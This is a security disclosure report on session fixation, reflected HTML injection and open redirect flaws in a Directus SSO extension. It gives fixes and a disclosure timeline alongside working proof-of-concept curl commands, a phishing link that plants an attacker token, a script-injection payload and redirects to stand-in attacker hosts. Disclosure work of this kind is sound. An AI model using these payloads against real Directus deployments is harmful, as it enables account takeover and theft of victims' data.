# Session Fixation + Open Redirect + Reflected XSS in `@ymys/directus-extension-sso`

| Field           | Value                                                                                          |
| --------------- | ---------------------------------------------------------------------------------------------- |
| Package         | `@ymys/directus-extension-sso`                                                                 |
| npm version     | `2.3.14` (latest at time of disclosure)                                                        |
| Monthly DLs     | ~1 021 / month                                                                                 |
| Repository      | https://github.com/ymys/directus-sso                                                           |
| Affected file   | `src/index.js`                                                                                 |
| Vulnerabilities | (a) `/sso/bridge` accepts an attacker-supplied `?token=` and writes it as the victim's `directus_session_token` cookie, then 302-redirects to `?redirect_uri=` — classic session fixation primitive. (b) `/sso/google-callback` reflects `redirect_uri` into a `text/html` response without escaping (HTML / formjacking injection; CSP partially mitigates inline JS). (c) `/sso/mobile-callback` 302-redirects to an unvalidated `redirect_uri` for browser UAs (open redirect). |
| CWEs            | CWE-384 Session Fixation, CWE-601 Open Redirect, CWE-79 Reflected XSS, CWE-345 Insufficient Verification of Data Authenticity |
| CVSS 3.1 vector | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`                                                          |
| CVSS 3.1 score  | **9.0 / 10 — CRITICAL** for the `/sso/bridge` chain. Conservative `PR:L` because the attacker needs *some* valid Directus token (own account, self-signup, leaked test creds). When the deployment allows public registration (or a token leaks via any other path) `PR:N` raises this to **9.6**. |
| Reporter        | CyberXplore (blogwithvansh@gmail.com)                                                          |
| Date discovered | 2026-05-19                                                                                     |

---

## TL;DR

`GET /sso/bridge` does:

```js
const { token, redirect_uri } = req.query;
const meResponse = await fetch(`${PUBLIC_URL}/users/me`, {
    headers: { Authorization: `Bearer ${token}` },        // ← attacker's token
});
if (!meResponse.ok) return res.status(401).json(...);

res.cookie(SESSION_COOKIE_NAME, token, { httpOnly: true, secure: true, ... });
return res.redirect(redirect_uri);                         // ← attacker URL
```

There is no check that `token` belongs to the *requester*. So:

1. Attacker (own account, low-priv) logs in normally.
2. Attacker sends victim the link:
   `https://VICTIM/sso/bridge?token=<attacker_jwt>&redirect_uri=https://VICTIM/admin/content`
3. Victim's browser receives `Set-Cookie: directus_session_token = <attacker_jwt>`.
4. Victim is now "logged in" as the attacker. All subsequent activity on
   the Directus instance — uploads, edits, comments, drafts — is recorded
   under the attacker's identity, which the attacker can read from their
   own dashboard.

For Directus deployments with public registration (or any other way to
get a token, e.g. a leaked test credential), this is **near-CRITICAL** —
no admin access needed by the attacker.

Two bonus bugs in the same package (`/sso/google-callback` reflected
HTML, `/sso/mobile-callback` open redirect) compound the surface.

---

## Affected endpoints

```
GET  /sso/bridge          ?token=...&redirect_uri=...
GET  /sso/google-callback ?access_token=...&redirect_uri=...
GET  /sso/mobile-callback ?redirect_uri=...
```

None of them require `req.accountability?.user`.

---

## Proof of Concept — Session Fixation via /sso/bridge

```bash
# Attacker logs in (any valid Directus user — typically self-signup):
curl -X POST http://VICTIM/auth/login -H 'Content-Type: application/json' \
     -d '{"email":"attacker@example.com","password":"AttackerPass!2026"}'
# => {"data":{"access_token":"<ATT_JWT>","refresh_token":"..."}}

# Phishing link the victim clicks:
curl -i -c victim_jar \
     "http://VICTIM/sso/bridge?token=<ATT_JWT>&redirect_uri=https://attacker.evil.example/dashboard"
# HTTP/1.1 302 Found
# Set-Cookie: directus_session_token=<ATT_JWT>; HttpOnly; Secure; SameSite=Lax
# Location: https://attacker.evil.example/dashboard

# Verify the victim is now operating as the attacker:
curl -b victim_jar http://VICTIM/users/me
# {"data":{"id":"4c451331-...","email":"attacker@example.com", ...}}
```

Live capture (`evidence/full_capture.txt`):

```
Set-Cookie: directus_session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
            eyJpZCI6IjRjNDUxMzMxLTEzYmMtNDg3NS1iNWExLTJmOTIxZTA3YzgyZSIs
            InJvbGUiOiIzOTBiMTRjMy0wZjg4LTQ2NWQtYjA5Yy0yZGE0NTY4OWU0YzMi
            LCJhcHBfYWNjZXNzIjp0cnVlLCJhZG1pbl9hY2Nlc3MiOmZhbHNlLCJpYXQi
            OjE3NzkyMTk5MDksImV4cCI6MTc3OTIyMDgwOSwiaXNzIjoiZGlyZWN0dXMi
            fQ.wm2Kas7KtAhrWu_zYF0NFq40rwgG2hwXaYY63Rlsl8E
$ curl -b victim_jar http://VICTIM/users/me
    email: attacker@example.com
    id:    4c451331-13bc-4875-b5a1-2f921e07c82e
    role:  390b14c3-0f88-465d-b09c-2da45689e4c3
```

Screenshots: `screenshots/01_vulnerable_code.png`,
`screenshots/02_session_fixation_exploit.png`,
`screenshots/03_xss_and_open_redirect.png`.

---

## Bonus 1 — Reflected HTML/XSS in /sso/google-callback

```bash
curl -A 'Mozilla/5.0 Chrome/120.0 Safari' \
     'http://VICTIM/sso/google-callback?access_token=<ATT_JWT>&redirect_uri=https://evil.com/%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E'
```

Response (`text/html`):

```html
<html><head>
  <meta http-equiv="refresh" content="2;url=https://evil.com/"><script>alert(document.domain)</script>">
</head><body>Login Successful!</body></html>
```

`script-src 'self' 'unsafe-eval'` on the Directus default CSP blocks the
inline `<script>` from executing in modern browsers, but the HTML
structure injection still renders, which is sufficient for:

- Replacing "Login Successful!" with a fake password prompt
- Embedding `<form action="https://attacker/">` (form-jacking)
- Inserting tracking pixels / `<link rel=prefetch>` to attacker domains

---

## Bonus 2 — Open Redirect in /sso/mobile-callback

```bash
curl -i -A 'Mozilla/5.0 Chrome/120.0' -b victim_session.jar \
     'http://VICTIM/sso/mobile-callback?redirect_uri=https://attacker.evil.example/'
# HTTP/1.1 302 Found
# Set-Cookie: directus_session_token=<victim's session>; HttpOnly; Secure; SameSite=Lax
# Location: https://attacker.evil.example/
```

Useful for phishing chains — the redirect happens *from* the trusted
Directus domain, which makes the destination look legitimate in the
location bar before redirect.

---

## Steps to Reproduce Locally

```bash
cd directus-sso-poc
docker compose up -d                 # starts Directus 10.10.0 + extension

# wait for http://localhost:8062/server/info to return 200

# bootstrap an "attacker" user that simulates self-signup or any leaked cred:
ADMIN=$(curl -s -X POST http://localhost:8062/auth/login \
        -H 'Content-Type: application/json' \
        -d '{"email":"admin@example.com","password":"AdminPassword123!"}' \
        | jq -r .data.access_token)
ROLE=$(curl -s -X POST http://localhost:8062/roles \
       -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
       -d '{"name":"AttackerRole","admin_access":false,"app_access":true}' \
       | jq -r .data.id)
curl -X POST http://localhost:8062/users \
     -H "Authorization: Bearer $ADMIN" -H 'Content-Type: application/json' \
     -d "{\"email\":\"attacker@example.com\",\"password\":\"AttackerPass!2026\",
          \"role\":\"$ROLE\",\"status\":\"active\"}"

bash poc/exploit.sh
```

---

## Impact

- **Account takeover by session fixation.** The attacker pre-mints
  their own valid Directus session, then plants it into the victim's
  browser. Everything the victim does — drafts, file uploads, comments,
  internal messages, profile edits — is performed in the attacker's
  account. The attacker simply opens their own dashboard and harvests.
- **Inverse data-theft.** Because the victim *thinks* they're in their
  own account, they will often enter sensitive content (PII, internal
  notes, customer data) that ends up in the attacker's account record.
- **Persistence.** The session cookie has `Max-Age=604800` (7 days).
  Even if the user logs in again, the attacker still has the JWT they
  themselves logged in with — which is the bound to the *attacker's*
  user, not the victim's.
- **Composability with Directus admin flows.** When the victim is an
  admin user, the takeover is still effective for harvesting whatever
  the admin then types into the (attacker-owned) session — credential
  copies, screen-shared sessions, internal docs pasted into rich-text
  fields, etc.

---

## Recommended Fix

1. **Remove `/sso/bridge` outright**, or — if the use case is a WebView
   bootstrap — require the user to prove ownership of the token before
   it is written to the cookie. Concretely:

   - Require a one-time, server-issued *exchange code* that has been
     generated for this user/device combination (issued via an
     authenticated `POST /sso/issue-bridge-code` while the user is
     already authenticated to the SSO).
   - The bridge endpoint accepts that exchange code, not a raw JWT.

2. **Validate `redirect_uri` against an allow-list** in all three
   handlers. Accept only origins that match
   `new URL(PUBLIC_URL).origin` (or an explicit `MOBILE_APP_*` list).

3. **HTML-escape `redirect_uri` (and every other reflected value)**
   before injecting into the HTML template. Use a templating helper
   that does this by default, or send a `text/plain` body instead.

4. **Sign and short-TTL all callback tokens.** A token used in a URL
   should be a single-use bearer that the server can revoke after the
   redirect. Long-lived JWTs in URLs are inherently dangerous.

5. **Defence in depth**: require `req.accountability?.user` for any
   route that mutates a cookie; the SSO endpoints should reject
   anonymous requests for anything beyond `/health`.

---

## Coordinated Disclosure

- **2026-05-19** — discovered, locally validated, this report drafted.
- **2026-05-19** — vendor notified via the repository's security advisory.
- **+90 days** — public disclosure if not patched.

---

## Files in this bundle

```
DISCLOSURE_REPORT.md                  this document
docker-compose.yml                    local validation environment
poc/exploit.sh                        end-to-end PoC script
evidence/full_capture.txt             curl request/response capture
screenshots/01..03_*.png              annotated visuals
extensions/.../dist/index.js          extension built from upstream v2.3.14
```
